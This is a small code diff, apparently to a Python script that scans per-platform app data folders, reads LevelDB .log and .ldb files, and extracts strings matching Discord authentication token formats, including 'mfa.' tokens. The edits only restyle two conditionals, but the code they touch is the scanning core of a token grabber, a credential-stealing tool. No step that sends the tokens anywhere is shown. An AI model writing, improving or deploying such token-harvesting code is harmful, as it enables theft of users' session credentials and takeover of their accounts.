@@ -47,7 +47,7 @@ for platform, path in paths.items():
         continue
 
     for item in os.listdir(path):
-        if (item[-4:] in ('.log', '.ldb')) is False:
+        if not item[-4:] in ('.log', '.ldb'):
             continue
 
         with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
@@ -56,7 +56,7 @@ for platform, path in paths.items():
         for line in lines:
             line = line.strip()
 
-            if line == "":
+            if len(line) == 0:
                 continue
 
             for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
